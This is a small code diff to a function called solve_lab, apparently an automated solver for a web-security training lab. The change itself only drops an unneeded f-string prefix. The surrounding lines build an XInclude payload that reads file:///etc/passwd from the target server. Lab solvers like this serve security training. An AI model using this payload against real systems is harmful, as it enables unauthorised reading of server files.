@@ -9,7 +9,7 @@ def solve_lab(session):
     xinclude = "{%s}" % xinclude_namespace
     nsmap = {"xi": xinclude_namespace}
 
-    foo = etree.Element(f"foo", nsmap=nsmap)
+    foo = etree.Element("foo", nsmap=nsmap)
     etree.SubElement(foo, f"{xinclude}include", parse="text", href="file:///etc/passwd")
     foo = etree.tostring(foo).decode()
 
